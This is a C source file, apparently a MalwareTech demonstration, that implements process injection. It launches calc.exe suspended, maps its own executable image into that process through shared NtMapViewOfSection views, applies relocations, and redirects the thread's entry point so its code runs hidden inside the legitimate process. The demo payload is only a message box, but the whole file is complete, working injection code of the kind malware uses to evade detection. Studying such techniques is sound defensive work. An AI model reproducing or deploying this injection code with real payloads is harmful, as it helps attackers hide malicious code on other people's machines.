/****************************************************************************************************
	This source is licensed under the MalwareTech Public License which gives you permission to use 
	it freely as long as the code is replicated using a Hansen ball typewriter and compiled by hand. 
*****************************************************************************************************/

#include <windows.h>
#include <stdio.h>

#include "NtDefs.h"

TypeNtUnmapViewOfSection NtUnmapViewOfSection;
TypeNtCreateSection NtCreateSection;
TypeNtMapViewOfSection NtMapViewOfSection;
TypeNtClose NtClose;

int RemoteMain();

/*
	Have to use dynamic linking as SDK doesn't define undocumented functions
*/
BOOL ResolveNativeApis()
{
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");

	NtUnmapViewOfSection = (TypeNtUnmapViewOfSection)GetProcAddress(ntdll, "NtUnmapViewOfSection");
	if(!NtUnmapViewOfSection)
		return FALSE;

	NtCreateSection = (TypeNtCreateSection)GetProcAddress(ntdll, "NtCreateSection");
	if(!NtCreateSection)
		return FALSE;

	NtMapViewOfSection = (TypeNtMapViewOfSection)GetProcAddress(ntdll, "NtMapViewOfSection");
	if(!NtMapViewOfSection)
		return FALSE;

	NtClose = (TypeNtClose)GetProcAddress(ntdll, "NtClose");
	if(!NtClose)
		return FALSE;

	return TRUE;
}

/*
	Using the relocation table, adjust all absolute addresses to work at new base address
	Parameters:
		CodeBuffer - Pointer to the code that requires relocation
		NewBase    - The address the code must be relocated to run at
*/
BOOL RelocatePE(PBYTE CodeBuffer, LPVOID NewBase)
{
	DWORD delta, RelocTableOffset, TotalSize, RelocTableSize, EntryOffset;
	int NumberOfEntries;
	PWORD StartOfEntries;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_BASE_RELOCATION reloc;

	delta = (DWORD)NewBase - (DWORD)GetModuleHandleA(NULL);

	NtHeaders = (PIMAGE_NT_HEADERS)((DWORD)CodeBuffer + 
		((PIMAGE_DOS_HEADER)CodeBuffer)->e_lfanew);
	
	if(NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress <= 0)
		return FALSE;

	RelocTableOffset = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;
	RelocTableSize = NtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

	reloc = (PIMAGE_BASE_RELOCATION)&CodeBuffer[RelocTableOffset];

	for(TotalSize = 0; TotalSize < RelocTableSize; TotalSize += reloc->SizeOfBlock, *(DWORD *)&reloc += reloc->SizeOfBlock)
	{
		NumberOfEntries = (reloc->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(WORD);
		StartOfEntries = (PWORD)((DWORD)(reloc) + sizeof(IMAGE_BASE_RELOCATION));

		for(int i = 0; i < NumberOfEntries; i++)
		{
			if((StartOfEntries[i] >> 12) & IMAGE_REL_BASED_HIGHLOW)
			{
				EntryOffset = reloc->VirtualAddress + (StartOfEntries[i] & 0xFFF);
				*(PDWORD)&CodeBuffer[EntryOffset] += (delta);
			}
		}
	}

	return TRUE;
}

/*
	Map our code into the target process using NtMapViewOfSection
	Parameters: 
		ProcessHandle - Handle to the remote process we will be zombifying
	Returns:
		Address of our code in the remote process
*/
LPVOID InjectProcess(HANDLE ProcessHandle)
{
	DWORD OriginalBaseAddress, OurBaseAddress;
	PIMAGE_NT_HEADERS NtHeaders;
	PIMAGE_SECTION_HEADER SectionHeader;
	NTSTATUS status;
	HANDLE SectionHandle = NULL;
	LARGE_INTEGER SectionMaxSize = {0,0};
	PVOID LocalAddress = NULL, RemoteAddress = NULL;
	DWORD ViewSize = 0;
	int i;
	BOOL success = FALSE;

	do { //This isn't a loop

		OurBaseAddress = (DWORD)GetModuleHandle(NULL);

		NtHeaders = (PIMAGE_NT_HEADERS)((DWORD)OurBaseAddress + ((PIMAGE_DOS_HEADER)OurBaseAddress)->e_lfanew);
		if(NtHeaders->Signature != IMAGE_NT_SIGNATURE)
		{
			printf("File is not valid PE\n");
			break;
		}

		SectionMaxSize.LowPart = NtHeaders->OptionalHeader.SizeOfImage;

		status = NtCreateSection(&SectionHandle, SECTION_MAP_EXECUTE | SECTION_MAP_READ | SECTION_MAP_WRITE, NULL, &SectionMaxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
		if(!NT_SUCCESS(status))
		{
			printf("NtCreateSection() failed with error: %X\n", status);
			break;
		}

		//Map a view of the section into the local process
		//RemoteAddress is set to NULL which means the system will choose where to allocate the memory, to avoid any address conflicts
		status = NtMapViewOfSection(SectionHandle, GetCurrentProcess(), &LocalAddress, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);
		if(!NT_SUCCESS(status))
		{
			printf("NtMapViewOfSection() failed with error: %X\n", status);
			break;
		}

		//Map a view of the section into the remote process
		//RemoteAddress is set to NULL which means the system will choose where to allocate the memory, to avoid any address conflicts
		status = NtMapViewOfSection(SectionHandle, ProcessHandle, &RemoteAddress, NULL, NULL, NULL, &ViewSize, 2, NULL, PAGE_EXECUTE_READWRITE);
		if(!NT_SUCCESS(status))
		{
			printf("NtMapViewOfSection() failed with error: %X\n", status);
			break;
		}

		//Remote section is a mirror of local one, everything we do to local section is reflected in remote
		memcpy(LocalAddress, (LPVOID)OurBaseAddress, NtHeaders->OptionalHeader.SizeOfImage);
		RelocatePE((PBYTE)LocalAddress, RemoteAddress);

		success = TRUE;
		
	} while (FALSE);

	if(success == FALSE && RemoteAddress != NULL)
	{
		NtUnmapViewOfSection(ProcessHandle, RemoteAddress);
		RemoteAddress = NULL;
	}

	if(LocalAddress != NULL)
		NtUnmapViewOfSection(GetCurrentProcess(), LocalAddress);

	if(SectionHandle != NULL)
		NtClose(SectionHandle);

	return RemoteAddress;
}

/*
	Run the target process in a suspended state, inject our code, then resume process
	Parameters:
		ImagePath - The path of the executable to Zombify
*/
int CreateZombifiedProcess(WCHAR *ImagePath)
{
	BOOL success = FALSE;
	PROCESS_INFORMATION ProcessInfo = {0};
	STARTUPINFOW StartupInfo = {0};
	CONTEXT ThreadContext;
	LPVOID BaseAddress;

	do { //This isn't a loop

		if(!ResolveNativeApis())
		{
			printf("Failed to resolve functions from ntdll\n");
			break;
		}

		if(!CreateProcessW(NULL, ImagePath, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &ProcessInfo))
		{
			printf("CreateProcessA() Failed with error: %d\n", GetLastError());
			break;
		}

		BaseAddress = InjectProcess(ProcessInfo.hProcess);
		if(!BaseAddress)
		{
			printf("Failed to remap process\n");
			break;
		}
		
		ThreadContext.ContextFlags = CONTEXT_INTEGER;

		if(!GetThreadContext(ProcessInfo.hThread, &ThreadContext))
		{
			printf("GetThreadContext() Failed with error: %d\n", GetLastError());
			break;
		}

		//Thread begins at BaseThreadInitThunk which gets the entry point from the EAX register then calls it
		ThreadContext.Eax = (DWORD)((DWORD)&RemoteMain - (DWORD)GetModuleHandle(NULL)) + (DWORD)BaseAddress;

		if(!SetThreadContext(ProcessInfo.hThread, &ThreadContext))
		{
			printf("SetThreadContext() Failed with error: %d\n", GetLastError());
			break;
		}

		if(!ResumeThread(ProcessInfo.hThread))
		{
			printf("Failed to unsuspended process, Error: %d\n", GetLastError());
			break;
		}

		printf("{Injection Succesful}\n" \
			"%ws\n" \
			"Remote Base Address: 0x%X\n" \
			"Remote Entry Point:  0x%X\n",
			ImagePath,
			ThreadContext.Eax,
			BaseAddress);

		success = TRUE;

	} while (FALSE);

	if(success == FALSE && ProcessInfo.hProcess != NULL)
	{
		TerminateProcess(ProcessInfo.hProcess, 0);
	}

	if(ProcessInfo.hProcess != NULL)
		CloseHandle(ProcessInfo.hProcess);

	if(ProcessInfo.hThread != NULL)
		CloseHandle(ProcessInfo.hThread);

	return success;
}

int main()
{
	WCHAR ImagePath[MAX_PATH];

	ExpandEnvironmentStringsW(L"%windir%\\system32\\calc.exe", ImagePath, MAX_PATH-1);
	CreateZombifiedProcess(ImagePath);

	getchar();
	return 0;
}

/*
	This is the function we will execute in the remote process
*/
int RemoteMain()
{
	MessageBoxA(NULL, "MalwareTech's hacks are the best hacks.", "www.malwaretech.com", MB_ICONINFORMATION);
	return 0;
}